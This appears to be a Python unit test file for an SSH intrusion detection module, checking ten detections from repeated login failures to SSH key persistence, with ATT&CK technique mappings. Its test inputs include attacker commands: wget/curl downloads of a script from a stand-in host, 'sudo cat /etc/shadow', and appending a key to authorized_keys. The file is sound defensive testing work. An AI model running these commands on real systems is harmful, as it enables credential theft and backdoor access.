import unittest

from src.detections import (
    DetectedBehavior,
    detect_repeated_authentication_failures,
    detect_success_after_failures,
    detect_multi_account_authentication_probing,
    detect_privileged_account_targeting,
    detect_persistent_authentication_probing,
    detect_post_authentication_command_execution,
    detect_system_reconnaissance,
    detect_external_file_download,
    detect_privilege_escalation_attempt,
    detect_ssh_authorized_key_persistence,
)


class TestD001RepeatedAuthenticationFailures(unittest.TestCase):

    def test_below_threshold_returns_none(self):
        result = detect_repeated_authentication_failures(4)
        self.assertIsNone(result)

    def test_threshold_detects(self):
        result = detect_repeated_authentication_failures(5)

        self.assertIsInstance(result, DetectedBehavior)
        self.assertEqual(result.detection_id, "D001")
        self.assertEqual(
            result.behavior,
            "repeated_authentication_failures",
        )

    def test_attack_mapping(self):
        result = detect_repeated_authentication_failures(6)

        self.assertEqual(
            result.attack_technique_id,
            "T1110",
        )
        self.assertEqual(
            result.attack_mapping_status,
            "supported",
        )


class TestD002SuccessAfterFailures(unittest.TestCase):

    def test_no_failures_returns_none(self):
        result = detect_success_after_failures(
            failed_count=0,
            successful_count=1,
        )

        self.assertIsNone(result)

    def test_no_success_returns_none(self):
        result = detect_success_after_failures(
            failed_count=3,
            successful_count=0,
        )

        self.assertIsNone(result)

    def test_detects_success_after_failures(self):
        result = detect_success_after_failures(
            failed_count=3,
            successful_count=1,
        )

        self.assertEqual(result.detection_id, "D002")
        self.assertEqual(
            result.behavior,
            "successful_authentication_after_failures",
        )
        self.assertEqual(
            result.attack_mapping_status,
            "contextual",
        )


class TestD003MultiAccountProbing(unittest.TestCase):

    def test_two_accounts_do_not_trigger(self):
        result = detect_multi_account_authentication_probing(
            ["root", "admin"]
        )

        self.assertIsNone(result)

    def test_three_accounts_trigger(self):
        result = detect_multi_account_authentication_probing(
            ["root", "admin", "test"]
        )

        self.assertEqual(result.detection_id, "D003")

    def test_duplicate_accounts_do_not_inflate_count(self):
        result = detect_multi_account_authentication_probing(
            ["root", "root", "admin", "admin"]
        )

        self.assertIsNone(result)

    def test_password_spray_mapping_is_contextual(self):
        result = detect_multi_account_authentication_probing(
            ["root", "admin", "test"]
        )

        self.assertEqual(
            result.attack_technique_id,
            "T1110.003",
        )
        self.assertEqual(
            result.attack_mapping_status,
            "contextual",
        )


class TestD004PrivilegedAccountTargeting(unittest.TestCase):

    def test_normal_account_does_not_trigger(self):
        result = detect_privileged_account_targeting(
            ["alice", "bob"]
        )

        self.assertIsNone(result)

    def test_root_triggers(self):
        result = detect_privileged_account_targeting(
            ["alice", "root"]
        )

        self.assertEqual(result.detection_id, "D004")

    def test_admin_is_case_insensitive(self):
        result = detect_privileged_account_targeting(
            ["ADMIN"]
        )

        self.assertIsNotNone(result)


class TestD005PersistentAuthenticationProbing(unittest.TestCase):

    def test_single_window_does_not_trigger(self):
        result = detect_persistent_authentication_probing(
            incident_window_count=1,
            failed_count=10,
        )

        self.assertIsNone(result)

    def test_multiple_windows_trigger(self):
        result = detect_persistent_authentication_probing(
            incident_window_count=3,
            failed_count=12,
        )

        self.assertEqual(result.detection_id, "D005")

    def test_no_failures_does_not_trigger(self):
        result = detect_persistent_authentication_probing(
            incident_window_count=3,
            failed_count=0,
        )

        self.assertIsNone(result)


class TestD006PostAuthenticationCommands(unittest.TestCase):

    def test_commands_without_success_do_not_trigger(self):
        result = detect_post_authentication_command_execution(
            successful_count=0,
            commands=["whoami"],
        )

        self.assertIsNone(result)

    def test_success_without_commands_does_not_trigger(self):
        result = detect_post_authentication_command_execution(
            successful_count=1,
            commands=[],
        )

        self.assertIsNone(result)

    def test_success_and_command_trigger(self):
        result = detect_post_authentication_command_execution(
            successful_count=1,
            commands=["whoami"],
        )

        self.assertEqual(result.detection_id, "D006")
        self.assertEqual(
            result.behavior,
            "post_authentication_command_execution",
        )


class TestD007SystemReconnaissance(unittest.TestCase):

    def test_normal_command_does_not_trigger(self):
        result = detect_system_reconnaissance(
            ["echo hello"]
        )

        self.assertIsNone(result)

    def test_uname_triggers(self):
        result = detect_system_reconnaissance(
            ["uname -a"]
        )

        self.assertEqual(result.detection_id, "D007")

    def test_multiple_recon_commands_are_evidence(self):
        result = detect_system_reconnaissance(
            [
                "whoami",
                "hostname",
                "uname -a",
            ]
        )

        evidence = " ".join(result.evidence)

        self.assertIn("whoami", evidence)
        self.assertIn("hostname", evidence)
        self.assertIn("uname -a", evidence)

    def test_attack_mapping(self):
        result = detect_system_reconnaissance(
            ["uname -a"]
        )

        self.assertEqual(
            result.attack_technique_id,
            "T1082",
        )


class TestD008ExternalFileDownload(unittest.TestCase):

    def test_unrelated_command_does_not_trigger(self):
        result = detect_external_file_download(
            ["ls -la"]
        )

        self.assertIsNone(result)

    def test_wget_triggers(self):
        result = detect_external_file_download(
            ["wget http://example.test/tool.sh"]
        )

        self.assertEqual(result.detection_id, "D008")

    def test_curl_triggers(self):
        result = detect_external_file_download(
            ["curl http://example.test/tool.sh"]
        )

        self.assertIsNotNone(result)

    def test_attack_mapping(self):
        result = detect_external_file_download(
            ["wget http://example.test/tool.sh"]
        )

        self.assertEqual(
            result.attack_technique_id,
            "T1105",
        )


class TestD009PrivilegeEscalation(unittest.TestCase):

    def test_normal_command_does_not_trigger(self):
        result = detect_privilege_escalation_attempt(
            ["pwd"]
        )

        self.assertIsNone(result)

    def test_sudo_triggers(self):
        result = detect_privilege_escalation_attempt(
            ["sudo cat /etc/shadow"]
        )

        self.assertEqual(result.detection_id, "D009")

    def test_su_triggers(self):
        result = detect_privilege_escalation_attempt(
            ["su root"]
        )

        self.assertIsNotNone(result)

    def test_mapping_is_contextual(self):
        result = detect_privilege_escalation_attempt(
            ["sudo whoami"]
        )

        self.assertEqual(
            result.attack_technique_id,
            "T1548",
        )
        self.assertEqual(
            result.attack_mapping_status,
            "contextual",
        )


class TestD010SSHAuthorizedKeyPersistence(unittest.TestCase):

    def test_unrelated_command_does_not_trigger(self):
        result = detect_ssh_authorized_key_persistence(
            ["ls ~/.ssh"]
        )

        self.assertIsNone(result)

    def test_authorized_keys_write_triggers(self):
        result = detect_ssh_authorized_key_persistence(
            [
                'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys'
            ]
        )

        self.assertEqual(result.detection_id, "D010")

    def test_mapping_is_supported(self):
        result = detect_ssh_authorized_key_persistence(
            [
                'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys'
            ]
        )

        self.assertEqual(
            result.attack_technique_id,
            "T1098.004",
        )

        self.assertEqual(
            result.attack_mapping_status,
            "supported",
        )

    def test_evidence_contains_authorized_keys(self):
        result = detect_ssh_authorized_key_persistence(
            [
                'echo "key" >> ~/.ssh/authorized_keys'
            ]
        )

        evidence = " ".join(result.evidence)

        self.assertIn(
            "authorized_keys",
            evidence,
        )


if __name__ == "__main__":
    unittest.main()
